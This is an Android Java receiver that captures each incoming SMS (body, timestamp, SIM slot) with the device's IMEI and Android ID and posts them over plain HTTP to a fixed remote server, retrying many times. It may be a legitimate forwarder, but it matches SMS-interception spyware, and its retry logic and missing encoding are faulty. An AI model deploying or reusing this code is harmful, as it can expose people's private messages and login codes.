package com.anhHong.monitor;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;

import com.loopj.android.http.AsyncHttpClient;
import com.loopj.android.http.AsyncHttpResponseHandler;

import java.io.UnsupportedEncodingException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

import cz.msebera.android.httpclient.Header;
import cz.msebera.android.httpclient.entity.StringEntity;

public class SMSReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle extras = intent.getExtras();
        Object[] pduArray = (Object[]) extras.get("pdus");
        int slot = capturedSimSlot(extras);

        // Android ID
        String android_id = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);

        // Imei
        String imei;
        try {
            imei = ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE)).getImei();
        } catch (Exception e) {
            imei = "";
        }

        SmsMessage[] messages = new SmsMessage[pduArray.length];
        for (int i = 0; i < pduArray.length; i++)
            messages[i] = SmsMessage.createFromPdu((byte[]) pduArray[i]);

        // So gui den
        String SideNumber = messages[0].getDisplayOriginatingAddress();

        // Time
        long Timestamp = messages[0].getTimestampMillis();

        // Noi dung
        StringBuilder bt = new StringBuilder();
        for (SmsMessage message : messages) bt.append(message.getMessageBody());
        String Smsbody = bt.toString();

        System.out.println("SMS: " + Smsbody);
        System.out.println("SideNumber: " + SideNumber);
        System.out.println("Timestamp: " + Timestamp);
        System.out.println("From: " + slot);
        System.out.println("android_id: " + android_id);
        System.out.println("imei: " + imei);

        sendReport(context, Smsbody, Timestamp, slot, android_id, imei);
    }

    private void sendReport(Context context, String Smsbody, long Timestamp, int number, String android_id, String imei) {
        final DateFormat formatter = new SimpleDateFormat("yyyy/MM/dd HH:mm");
        System.out.println(Smsbody + " " + Timestamp + " " + number + " " + android_id);

        AsyncHttpClient client = new AsyncHttpClient();
        StringEntity entity = null;
        try {
            entity = new StringEntity("date=" + formatter.format(new Date(Timestamp)) +
                    "&message=" + Smsbody +
                    "&mobile_number=" + number +
                    "&android_id=" + android_id +
                    "&imei=" + imei
            );
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        entity.setContentType("application/x-www-form-urlencoded");
        client.setMaxRetriesAndTimeout(50, 10000);
        client.post(context, "http://farmer.slhair.vn/api/sms/create",
                entity,
                "application/x-www-form-urlencoded",
                new AsyncHttpResponseHandler() {

                    @Override
                    public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                        System.out.println(new String(responseBody));
                    }

                    @Override
                    public void onFailure(int statusCode, Header[] headers, byte[] errorResponse, Throwable e) {
                        if (statusCode == 500) {
                            sendReport(context, Smsbody, Timestamp, number, android_id, imei);
                            try {
                                System.out.println(new String(errorResponse));
                            } catch (Exception ex) {
                                System.out.println(ex.getMessage());
                            }
                        }
                    }

                    @Override
                    public void onRetry(int retryNo) {
                        super.onRetry(retryNo);
                        sendReport(context, Smsbody, Timestamp, number, android_id, imei);
                    }
                }
        );
    }

    private int capturedSimSlot(Bundle bundle) {

        int whichSIM = -1;
        if (bundle.containsKey("subscription")) {
            whichSIM = bundle.getInt("subscription");
        }
        if (whichSIM >= 0 && whichSIM < 5) {
            /*In some device Subscription id is return as subscriber id*/
//            sim = ""+whichSIM;
            return whichSIM;
        } else {
            if (bundle.containsKey("simId")) {
                whichSIM = bundle.getInt("simId");
            } else if (bundle.containsKey("com.android.phone.extra.slot")) {
                whichSIM = bundle.getInt("com.android.phone.extra.slot");
            } else {
                String keyName = "";
                for (String key : bundle.keySet()) {
                    if (key.contains("sim"))
                        keyName = key;
                }
                if (bundle.containsKey(keyName)) {
                    whichSIM = bundle.getInt(keyName);
                }
            }
        }
        return whichSIM;
    }
}
